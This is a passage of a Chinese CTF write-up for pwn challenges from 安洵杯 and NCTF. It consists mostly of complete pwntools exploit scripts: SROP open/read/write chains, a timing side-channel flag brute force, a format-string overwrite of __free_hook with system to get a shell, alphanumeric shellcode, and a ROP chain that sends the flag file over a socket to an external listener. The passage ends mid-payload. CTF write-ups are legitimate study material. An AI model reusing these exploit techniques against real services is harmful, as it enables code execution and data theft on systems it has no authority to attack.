sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))

def mydbg():
    gdb.attach(p)
    pause()

def menu(choice):
    ru(&#34;4. Quit.\n&#34;)
    sl(str(choice))

def add(ip,hop):
    menu(1)
    ru(&#34;Input destination IP:&#34;)
    sl(ip)
    ru(&#34;Input the next hop:&#34;)
    sl(hop)
def show(ip):
    menu(2)
    ru(&#34;Input destination IP:&#34;)
    sl(ip)
    ru(&#34;The next hop is &#34;)

def decode_flag(flag):
    flag=flag.decode()
    ascii_representation = &#39;&#39;.join(chr(int(x)) for x in flag.split(&#39;.&#39;))[::-1]
    print(ascii_representation)

leak_list=[&#34;255.255.255.255&#34;,&#34;128.0.0.0&#34;,&#34;192.0.0.0&#34;,&#34;224.0.0.0&#34;,&#34;240.0.0.0&#34;,&#34;248.0.0.0&#34;]
#leak_list=[&#34;255.255.255.255&#34;,&#34;127.255.255.255&#34;,&#34;63.255.255.255&#34;,&#34;31.255.255.255&#34;,&#34;15.255.255.255&#34;,&#34;7.255.255.255&#34;]
for leak_ip in leak_list:
    p=process(&#39;./trie&#39;)
    add(&#34;0.0.0.0&#34;,&#34;0.0.0.0&#34;)
    add(&#34;255.255.255.255&#34;,&#34;0.0.0.0&#34;)
    #mydbg()
    add(leak_ip,&#34;0.0.0.0&#34;)
    menu(3)
    show(leak_ip)
    flag=ru(&#34;\n&#34;)[:-1]
    decode_flag(flag)
    p.close()

```



### A-rstp

待做

## 安洵杯 I-SOON x D0g3

### side_channel , initiate!

首先让bss段读入ROP链，然后栈迁移执行ROP链，ROP链中使用SROP ORW一把嗦

```python
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
p=remote(&#34;47.108.206.43&#34;,26637)
#p=process(&#39;./chall&#39;)

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p)
	pause()
bss=0x0404060
leave_ret=0x000000000040136c
mov_rax_15_ret=0x401193 
syscall_ret=0x000000000040118a
ru(&#34;easyhack\n&#34;)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_open
sigframe.rdi = bss&#43;0x400
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = bss&#43;0xf8&#43;0x10
sigframe.rip = syscall_ret
sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss&#43;0x420
sigframe1.rdx = 0x50
sigframe1.rsp = bss&#43;0xf8&#43;0x10&#43;0xf8&#43;0x10&#43;0x8
sigframe1.rip = syscall_ret
sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss&#43;0x420
sigframe2.rdx = 0x50
sigframe2.rsp = bss&#43;0xf8&#43;0x10&#43;0xf8&#43;0x10
sigframe2.rip = syscall_ret

#F8
payload=p64(mov_rax_15_ret)&#43;p64(syscall_ret)&#43;bytes(sigframe)&#43;p64(0)&#43;p64(mov_rax_15_ret)&#43;p64(syscall_ret)&#43;bytes(sigframe1)
payload&#43;=p64(0)&#43;p64(mov_rax_15_ret)&#43;p64(syscall_ret)&#43;bytes(sigframe2)
payload=payload.ljust(0x400,b&#34;\x00&#34;)&#43;b&#34;flag\x00\x00\x00\x00&#34;
sl(payload)
ru(&#34;Do u know what is SUID?&#34;)
#mydbg()
payload=b&#39;a&#39;*0x2a&#43;p64(bss-0x8)&#43;p64(leave_ret)
sl(payload)

p.interactive()
```

### Seccomp

跟上题大概逻辑一样，开的沙箱不一样，禁用了write，运行mprotect，那么利用srop 使用mprotect开辟rwx段，然后写shellcode， open 打开flag ，read 读入flag ，然后 逐个字节爆破flag。

```python
from pwn import*
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p)
	pause()
bss=0x0404060
leave_ret=0x000000000040136c
mov_rax_15_ret=0x401193 
syscall_ret=0x000000000040118a


def pwn(pos, char):
	ru(&#34;easyhack\n&#34;)

	sigframe = SigreturnFrame()
	sigframe.rax = constants.SYS_mprotect
	sigframe.rdi = 0x404000
	sigframe.rsi = 0x500
	sigframe.rdx = 7
	sigframe.rsp = bss&#43;0xf8&#43;0x10
	sigframe.rip = syscall_ret
	shellcode=shellcraft.open(&#34;flag&#34;)
	shellcode&#43;=shellcraft.read(3,bss&#43;0x500,0x50)
	shellcode&#43;= F&#39;&#39;&#39;
		cmp byte ptr[rsi&#43;{pos}], {char}
		jz loop
		ret
		loop:
		jmp loop
	&#39;&#39;&#39;
	#F8
	payload=p64(mov_rax_15_ret)&#43;p64(syscall_ret)&#43;bytes(sigframe)&#43;p64(0)&#43;p64(bss&#43;0xf8&#43;0x10&#43;0x10)&#43;asm(shellcode)
	sl(payload)
	ru(&#34;Do u know what is SUID?&#34;)
	#mydbg()
	payload=b&#39;a&#39;*0x2a&#43;p64(bss-0x8)&#43;p64(leave_ret)
	sl(payload)
	#pause()	

possible_list = &#34;-0123456789abcdefghijklmnopqrstuvwxyz{}&#34;
flag = &#34;&#34;
index = 0
last = &#39;a&#39;
while True:
    # 逐字符爆破
    update = False
    # 对于每个字符，遍历所有打印字符 (ascii 码从 32 到 127) 
    for ch in range(32,127):
        p=remote(&#34;47.108.206.43&#34;,24921)
        #p = process(&#34;./chall&#34;)
        # 远程比较容易断，可以多次连接
        &#39;&#39;&#39;
        for i in range(10):
            try:
                sh = remote(&#34;1.1.1.1&#34;, &#34;11111&#34;)
                break
            except:
                sleep(3)
                continue
        &#39;&#39;&#39;
        pwn(index, ch)
        start = time.time()
        try:
            p.recv(timeout=2)
        except:
            pass
        end = time.time()
        p.close()
        # 测试接收时延，超过一定时限则说明在 pwn() 函数中插入 shellcode 后卡循环了，即 flag 中的第 index 个字符是 ch
        if(end-start &gt; 1.5):
            flag &#43;= chr(ch)
            last = chr(ch)
            update = True
            print(&#34;[ flag &#43; 1 !!! ] &#34; &#43; flag)
            break
    
    assert(update == True)
    
    if(last == &#39;}&#39;):
        break
    
    index &#43;= 1

print(&#34;flag: &#34; &#43; flag)
```

### my_QQ

参考链接：https://ycznkvrmzo.feishu.cn/docx/G17xduF91omE5nxgkgfc1W93nqb

前言：比赛时进入到了存在格式化字符串漏洞的函数，但是一直卡在rc4 加解密那里

首先介绍一下程序怎么启动

在本地目录下创下如下目录&#34;./pem/server/&#34;

然后使用openssl生成公私钥

```bash
openssl genrsa -out privatekey.pem 1024
openssl rsa -in privatekey.pem -out public.pem -outform PEM -pubout

```

![image-20240112200247729](assets/202401150126774.png)

接着程序开启一个10000端口，并向该端口接收和发送数据

进入start_routine 函数，主要有两个功能，register 和login，接收4字节，如果为yes， 则进入login 函数，如果不是，则进入register 函数。接下来先看register 功能

![image-20240112202203477](assets/202401150126775.png)

首先接收0x400字节的buf，buf 输入的内容后面进行介绍，接下来进行公钥验证，然后进入register 函数中

![image-20240112211306960](assets/202401150126776.png)

verify_key 函数中，会向1000端口的socket 链接发送public key，在1000端口的socket 链接中，我们接收到该pulbic key之后再发送给该程序即可

![image-20240112212123823](assets/202401150126777.png)



接下来进入register func 中，首先需要连接数据库，然后从a3（也就是上面说的0x400字节的buf ）前0x10 字节复制给user_name ，后面的0x30 字节复制给password。然后通过sql 语句查询用户是否存在，如果存在，打印该用户的的注册时间，如果不存在，则在表中创建该用户字段。

![image-20240112214416104](assets/202401150126778.png)



注意需要连接mysql 数据库，因此我们需要安装mysql，并创建`my_qq`  数据库， 这俩我选择下载phpstudy 集成环境，user 表的具体字段由ida 的反汇编代码得知

![image-20240112203601236](assets/202401150126779.png)

![image-20240112203937155](assets/202401150126780.png)

![image-20240112211103792](assets/202401150126781.png)

![image-20240112210912812](assets/202401150126782.png)

接下来分析login 功能

首先接收0x400 的buf ，和register 中一样， 前0x10 字节是usrname，后0x30 字节是password，查询表中是否存在 user name 和password 相同的用户，接着是交换公钥。



![image-20240112220001934](assets/202401150126783.png) 

接着传输rc4 密钥，然后进入消息传递函数中，会对接收到的消息进行rc4 解密，然后打印

![image-20240112221410349](assets/202401150126784.png)

漏洞点即为格式化字符串漏洞

![image-20240112221435604](assets/202401150126785.png)

利用过程类似于栈上的格式化字符串漏洞，注意到dest，也就是rc4加密后的msg 的十六进制数据，其通过strlen进行计算长度的，如果我们通过在需要rc4加密后的数据上通过`&#34;\x00&#34;`填充，那么后面的数据就会截断，不会对其解密。

![image-20240113020048534](assets/202401150126786.png)

因此，我们在格式化字符串漏洞利用时只用对前面的`% size c% index hhn` 这些数据加密，`&#34;\x00&#34;`填充后跟上我们要篡改的地址即可。

&gt; 起初我是对payload都进行了加密，发现在314偏移处存在解密后的数据，于是我对此进行任意地址写，但是发现这里程序会直接调用free，触发free_hook，这里我们仅仅只修改了一字节，会导致程序crash。
&gt;
&gt; ![image-20240113022026079](assets/202401150126787.png)
&gt;
&gt; 但是为何会调用free的原因未知（下面exp中的方法就不会调用free)，我们可以考虑换一种方法，因为程序最后会调用exit(-1)，那么将exit_hook 修改为one_gadget 也是可以get shell 的。

本题的利用思路就是利用格式化字符串漏洞任意写free_hook 为system，然后发送加密后的`&#34;/bin/sh\x00&#34;`字符串即可getshell。

```python
from pwn import*
from Crypto.Cipher import ARC4
import base64
import struct

context.log_level=&#39;debug&#39;
local=1
debug=1
if local:
    p_server=process(&#39;./serverpthread_rsa_hash&#39;)
    libc=ELF(&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;)
    p=remote(&#34;0.0.0.0&#34;,10000)
else:
    p_server=remote(&#34;47.108.206.43&#34;,43481)
    libc=ELF(&#34;libc-2.31.so&#34;)
    p=remote(&#34;47.108.206.43&#34;,22820)

s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
#p=remote(&#34;47.108.206.43&#34;,44947)
def func(name,passwd):
	payload=name.ljust(0x10,b&#34;\x00&#34;)&#43;passwd.ljust(0x40,b&#34;\x00&#34;)
	return payload
def rc4_encrypt(data, key1):
      key = key1
      print(key)
      print(len(key))
      res = ARC4.new(key).encrypt(data).hex().encode()
      return res
def int_to_bytes(num):
    # 将整数转换为字节
    byte_data = num.to_bytes((num.bit_length() &#43; 7) // 8, &#39;big&#39;)
    return byte_data

#register
# s(&#34;no\x00\x00&#34;)

# s(func(b&#34;root&#34;,b&#34;root&#34;))

# root_public_key=ru(&#34;-----END PUBLIC KEY-----\n&#34;)

# print(root_public_key)

# s(root_public_key)


if local:
    #local public key
    root_public_key=&#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnJJhk&#43;sxDQWZeBXmpECm
HaWTpiZIh4EQfm9irhC5wQFOByWwiCrVrdi37h43rnp0PvnXEhKgGIokdoZLl1St
NwApRX7RitZCo2V28PaQzwJwFQoy95RvvAHNn7gJSylEuKQfAbzC5oGH8IvWNokM
&#43;wkSdtMQ9EzfKZ5eEfVJxUGofecK/4UsQqgOZPtumatJf84psQXtbQQTsw94dxoz
55JJ8z&#43;wsaqx4v3d21pggORPv1oR1LwIpWne1yPgOW3egGtpCO4FhoclYOIFehwh
dD5aFsZ8fuRAQPMiOPOKUo5EZwz/L4eocGchQXQTK1PEBU392rnAvoee71EfSl7f
7QIDAQAB
-----END PUBLIC KEY-----
&#34;&#34;&#34;
else:
    # remote_public_key
    root_public_key=&#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApoS1VyO6VZKyho32VC4/
btl1kgnMczBZvApAV2IC4h67fLbnnLlhOqiyIJcy6k6weK&#43;JAdLCmquADnKJ3ZyW
eChvFKJ/L39Cb5YEZoJs3kNST0cHqtYI1bZX7vCe1KBfMPuygXxkgNTcxG4Fdzwi
SmKmYDcdDxeZP1z708x92fvPyYvFWiyaAzyw9QTqdH&#43;JRcIRyVOdwc1ciSqqkaH4
TiOvVFHKsyInBIiF7bkl8mJMPb5vSKcVWrXHPEMcAiLmTG1mA1n/RKc&#43;Ux3fUfjt
0UiATggCL86vCDcMhdToU&#43;1QMdd3y&#43;Nay9x/vm2thp/TpCl&#43;MyzM1sld/TWJG&#43;10
CwIDAQAB
-----END PUBLIC KEY-----
&#34;&#34;&#34;


p.send(&#34;yes\x00&#34;)
pause()
p.send(func(b&#34;root&#34;,b&#34;root&#34;))
pause()
p.send(root_public_key)
ru(&#34;Login succeess &#34;)
rn(0x3f0)
rc4_key=int(ru(&#39;00&#39;),16)
rc4_key=int_to_bytes(rc4_key)

print(rc4_key)


msg = rc4_encrypt(b&#39;%1459$p&#39;,rc4_key)
if debug:
    gdb.attach(p_server,&#34;b *$rebase(0x000482B)&#34;)
    pause()
sl(msg)
p_server.recvuntil(&#34;The rc4_msg is&#34;)
p_server.recvuntil(&#34;The decode  rc4_msg is &#34;)
p_server.recvline()
libc_base=int(p_server.recvuntil(&#34;\n&#34;)[:-1],16)-libc.sym[&#39;write&#39;]-100
lg(&#34;libc_base&#34;)
free_hook=libc_base&#43;libc.sym[&#39;__free_hook&#39;]
sys_addr=libc_base&#43;libc.sym[&#39;system&#39;]
lg(&#34;free_hook&#34;)
lg(&#34;sys_addr&#34;)
for i in range(6):
    payload1=b&#39;%&#39; &#43; str(((sys_addr)&gt;&gt;(8*i)) &amp; 0xff).encode() &#43; b&#39;c%15$hhn&#39;
    payload1=rc4_encrypt(payload1,rc4_key)
    payload=payload1.ljust(0x48,b&#34;\x00&#34;)&#43;p64(free_hook&#43;i)
    sl(payload)
    pause()
payload=rc4_encrypt(b&#34;/bin/sh\x00&#34;,rc4_key)
sl(payload)
p.close()
p_server.interactive()
```



## NCTF

### checkin

本题开启的沙箱使用seccomp-tools 显示有点问题，应该是运行write 调用，但是要求fd为1，count 为1，read 要求fd为0，count为1。

![image-20231229152406589](assets/202401082251012.png)

![image-20231229153055090](assets/202401082251013.png)

程序要求我们输入可见字符，我们先利用push pop 将rax设置成当前rip 的值，然后调用ae64 将我们的输入的shellcode转化为可见字符shellcode。

所以正常写shellcode就行，比赛中我们的方法是：read 的count 可以使用0x100000001绕过，然后循环write flag即可

```python
from pwn import*
from ae64 import AE64
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
p=remote(&#34;8.130.35.16&#34;,58002)
#p=process([&#39;checkin&#39;])
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p,&#34;b *$rebase(0x01764)&#34;)
	pause()

#0x20230000
shellcode=&#34;&#34;
shellcode&#43;=&#34;&#34;&#34;
push 0x50505050
pop rax
xor rax,0x7073506c
&#34;&#34;&#34;
#sc=shellcraft.read(0,0x20230120,0x100000001)
flag_addr=0x20230000&#43;0xf0&#43;0x30
sc=f&#34;&#34;&#34;
push 0
pop rdi
push 3
pop rax
syscall
&#34;&#34;&#34;
sc&#43;=shellcraft.open(&#34;flag&#34;)
sc&#43;=f&#34;&#34;&#34;
push rax
pop rdi
push {flag_addr&#43;0x100}
pop rsi
mov rdx,0x100000001
push 0
pop rax
syscall
&#34;&#34;&#34;
sc&#43;=f&#34;&#34;&#34;
mov r8,0
loop:
push 1
pop rdi
push {flag_addr&#43;0x100}
pop rsi
add rsi,r8
push 0x1
pop rdx
push 0x1
pop rax
syscall
add r8,1
jmp loop
syscall
&#34;&#34;&#34;
ru(&#34;Give me your shellcode:&#34;)
#mydbg()
enc_shellcode = asm(shellcode)&#43;AE64().encode(asm(sc),&#39;rax&#39;,0,&#34;small&#34;)
print(hex(len(enc_shellcode)))
s(enc_shellcode.ljust(0xf0,b&#34;A&#34;)&#43;b&#34;flag&#34;)
p.interactive()
```

看了出题人 的博客，才知道原来read 是可以循环读的

```python
from pwn import*
from ae64 import AE64
context.arch=&#39;amd64&#39;
context.log_level=&#39;debug&#39;
p=remote(&#34;8.130.35.16&#34;,58002)
#p=process([&#39;checkin&#39;])
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p,&#34;b *$rebase(0x01764)&#34;)
	pause()

#0x20230000
shellcode=&#34;&#34;
shellcode&#43;=&#34;&#34;&#34;
push 0x50505050
pop rax
xor rax,0x7073506c
&#34;&#34;&#34;
#sc=shellcraft.read(0,0x20230120,0x100000001)
flag_addr=0x20230000&#43;0xf0&#43;0x30
sc=f&#34;&#34;&#34;
push 0
pop rdi
push 3
pop rax
syscall
&#34;&#34;&#34;
sc&#43;=shellcraft.open(&#34;flag&#34;)
sc&#43;=f&#34;&#34;&#34;
push rax
pop rdi
inc rdx
xor rbx,rbx
read_loop:
lea rsi,[rsp&#43;rbx]
inc rbx
xor rax,rax
syscall
cmp rax,0
jne read_loop
push 1
pop rdi
push 1
pop rdx
xor r8,r8
write_loop:
lea rsi,[rsp&#43;r8]
inc r8
push 1
pop rax
syscall
cmp r8,rbx
jne write_loop
push 0
&#34;&#34;&#34;
ru(&#34;Give me your shellcode:&#34;)
#mydbg()
enc_shellcode = asm(shellcode)&#43;AE64().encode(asm(sc),&#39;rax&#39;,0,&#34;small&#34;)
print(hex(len(enc_shellcode)))
s(enc_shellcode)
p.interactive()
```

### nception

这题考察的主要是c&#43;&#43; 的异常处理。

程序本身里有两个catch块，一个位于main中，一个位于cleanup函数中。

![image-20231230175735581](assets/202401082251014.png)

在edit中，会判断 输入的buf，通过strlen(buf)计算长度，并判断其是否超过size，如果超过，就进入异常处理。

![image-20231230175820132](assets/202401082251015.png)

在unwind过程中，存在恢复栈帧的过程，也就是leave_ret。

#### 思路一

main函数catch在while内部，会接着main逻辑执行，而cleanup函数中close掉012就leave_ret;return了。

那么我们就可以利用cleanup进行栈迁移，进行rop。

由于程序关闭了0，1，2

那么我们就要利用 `open(&#34;flag&#34;),sockfd = socket(2, 1, 0),connect(sockfd, socked_addr, 16),sendfile(sockfd,flag_fd,offset,count)`，然后本机监听端口获得flag。

socket结构体的获取可参考该文章：https://blog.wingszeng.top/pwn-use-socket-to-bypass-close-out/ 

此外还需介绍一些特殊的gadget 用于设置调用函数的参数。

```assembly
0x000000000040284c : pop rbx ; pop r12 ; pop rbp ; ret

0x4022dc &lt;__do_global_dtors_aux&#43;28&gt;:	add    DWORD PTR [rbp-0x3d],ebx
0x4022df &lt;__do_global_dtors_aux&#43;31&gt;:	nop
0x4022e0 &lt;__do_global_dtors_aux&#43;32&gt;:	ret  
```

在bss段残留的stderr stdout stdin 的libc地址，我们需要算出libc中函数地址具体这三者之一的偏移，通过上述两个gadget ，将其设置为我们想要的libc地址，接下来便是如何调用这个地址

```assembly
0x00000000004022dd : pop rbp ; ret
0x00000000004030e2 : mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax &#43; 0x10] ; pop rbp ; ret
0x000000000040226c : jmp rax

```

通过上述gadget 我们可以控制rbp，进而控制rax，通过jmp rax 实现任意地址跳转执行。

但是程序中并没有pop rdi，rsi，rdx，这样的gadget 。

因此我们需要利用libc中的这样的gadget，来控制函数的参数，最后再调用所需要的函数。由于一个chunk的大小为0x200，所以我们需要在多个chunk 中布置rop链，通过pop rsp进行栈迁移。

&gt; 事实上我们可以调用mprotect 函数开辟rwx段写shellcode，这样所需的字节就会少很多
&gt;
&gt; 另外，由于程序是使用strlen 计算 要复制buf的长度，那么如果出现ROP链中出现`&#34;\x00&#34;`，就会被截断，std::cin在读取字符时会跳过空白字符（空格、制表符、换行符等），所以我们需要额外判断一下，是分八字节写还是逐个字节写

```python
from pwn import*
context.arch=&#39;amd64&#39;
#context.log_level=&#39;debug&#39;
p=remote(&#34;8.130.35.16&#34;,58000)
#p=process(&#34;./pwn&#34;)
libc=ELF(&#34;./libc.so.6&#34;)
s = lambda data : p.send(data)
sl = lambda data : p.sendline(data)
sa = lambda text, data : p.sendafter(text, data)
sla = lambda text, data : p.sendlineafter(text, data)
r = lambda : p.recv()
rn = lambda x  : p.recvn(x)
ru = lambda text : p.recvuntil(text)
dbg = lambda text=None  : gdb.attach(p, text)
uu32 = lambda : u32(p.recvuntil(b&#34;\xff&#34;)[-4:].ljust(4, b&#39;\x00&#39;))
uu64 = lambda : u64(p.recvuntil(b&#34;\x7f&#34;)[-6:].ljust(8, b&#34;\x00&#34;))
lg = lambda s : log.info(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
pr = lambda s : print(&#39;\033[1;31;40m %s --&gt; 0x%x \033[0m&#39; % (s, eval(s)))
def mydbg():
	gdb.attach(p,&#34;b *0x402441&#34;)
	pause()


def menu(choice):
	ru(&#34;Now input your choice: &#34;)
	sl(str(choice))

def add():
	menu(1)

def edit(index,offset,content):
	menu(2)
	ru(&#34;To write object, input idx:&#34;)
	sl(str(index))
	ru(&#34;Now data offset:&#34;)
	sl(str(offset))
	ru(&#34;Now input your data:&#34;)
	s(content)

def show(idx):
	menu(3)
	ru(&#34;Which one do you want to read?&#34;)
	sl(str(idx))

def delete(idx):
	menu(4)
	ru(&#34;Which one do you want to destroy?&#34;)
	sl(str(idx))


#   0x4022dc &lt;__do_global_dtors_aux&#43;28&gt;:	add    DWORD PTR [rbp-0x3d],ebx
#   0x4022df &lt;__do_global_dtors_aux&#43;31&gt;:	nop
#   0x4022e0 &lt;__do_global_dtors_aux&#43;32&gt;:	ret  
	
#   0x0000000000402f31 : call ptr [rbp - 0x3d]
magic_gadget=0x4022dc
stdout_addr=0x406040
stderr_addr=0x4061A0 
call_rbp=0x0000000000402f31
pop_rbx_r12_rbp_ret=0x000000000040284c #: pop rbx ; pop r12 ; pop rbp ; ret

#0x0000000000403121 : mov rax, qword ptr [rbp - 0x18] ; leave ; ret
def edit_func(index,payload):
	for i in range(0, len(payload), 8):
		edit(index, i, payload[i:i&#43;8]&#43;b&#34;\n&#34;)

def edit_func1(index,offset,payload):
	for i in range(0, len(payload)):
		edit(index, i&#43;offset, payload[i:i&#43;1]&#43;b&#34;\n&#34;)

def modify(addr, offset,flag=False):
	if flag:
		print(&#34;offset=&#34;,offset)
		print(p32(offset, sign=&#39;signed&#39;))
		pause()
	return flat([
        p64(pop_rbx_r12_rbp_ret),
        p32(offset, sign=&#39;signed&#39;) &#43; p32(0),
		p64(0),
        p64(addr &#43; 0x3d),
        p64(magic_gadget),
    ])

add()
delete(0)
add()
show(0)
ru(&#34;Data: &#34;)
heap_addr=u32(rn(2).ljust(0x4,b&#34;\x00&#34;))&lt;&lt;12
lg(&#34;heap_addr&#34;)
add() #1
add() #2
add() #3
add() #4
add() #5
chunk1_addr=heap_addr&#43;0x1100
chunk2_addr=heap_addr&#43;0x1330
chunk3_addr=heap_addr&#43;0x1560
chunk4_addr=heap_addr&#43;0x1790
chunk5_addr=heap_addr&#43;0x19c0
sock_addr=chunk1_addr&#43;0x1d0
bss=0x4061D0
pop_rsp=0x000000000040284e #0x0000000000402577 : pop rsp ; pop r13 ; pop rbp ; ret

pop_rdi=0x0000000000027765
pop_rsi=0x0000000000028f19
pop_rdx=0x00000000000fdcfd
pop_rdx_rcx_rbx=0x00000000000edc7f #: pop rdx ; pop rcx ; pop rbx ; ret

pop_rbp=0x004030ea#: pop rbp; ret;
mov_rax=0x00000000004030e2# :# mov rax, qword ptr [rbp - 8] ; mov rax, qword ptr [rax &#43; 0x10] ; pop rbp ; ret 
jmp_rax=0x00402dbe# jmp rax;
flag_addr=heap_addr&#43;0x1100&#43;0x30
payload=b&#39;a&#39;*0x3&#43;p64(stdout_addr)&#43;b&#39;a&#39;*(0x2d-0x28)&#43;p64(0x4061A0-0x10)*3&#43;p64(stdout_addr-0x10)&#43;b&#34;flag\x00\x00\x00\x00&#34;&#43;p64(stdout_addr&#43;0x3d)
payload&#43;=flat([
    modify(stderr_addr, pop_rdi- libc.sym[&#39;_IO_2_1_stderr_&#39;]),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(flag_addr),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stderr_addr, pop_rdx-0x111111-pop_rsi),
    modify(stderr_addr, 0x111111),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stdout_addr, libc.sym[&#39;open&#39;]- libc.sym[&#39;_IO_2_1_stdout_&#39;]),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(pop_rsp),
	p64(chunk2_addr-0x8&#43;0x30)	
])
payload=payload.ljust(0x1d0,b&#34;\x00&#34;)
edit_func(1,payload)
edit_func1(1,0x1d0,p64(0xa2217c70b8220002).ljust(16, b&#39;\x00&#39;)) #socket struct
payload1=b&#39;a&#39;*0x30&#43;flat([
    modify(stderr_addr, pop_rdi-pop_rdx),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(2),
	modify(stderr_addr, pop_rsi- pop_rdi),
	p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(1),
    modify(stderr_addr, pop_rdx-0x111111-pop_rsi),
	modify(stderr_addr,0x111111),	
    p64(pop_rbp),
	p64(flag_addr-0x18),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(0),
	modify(stdout_addr,libc.sym[&#39;socket&#39;] - libc.sym[&#39;open&#39;]),
	p64(pop_rbp),
	p64(flag_addr),
	p64(mov_rax),
	p64(0),
	p64(jmp_rax),
	p64(pop_rsp),
	p64(chunk3_addr-0x8&#43;0x30)	
])
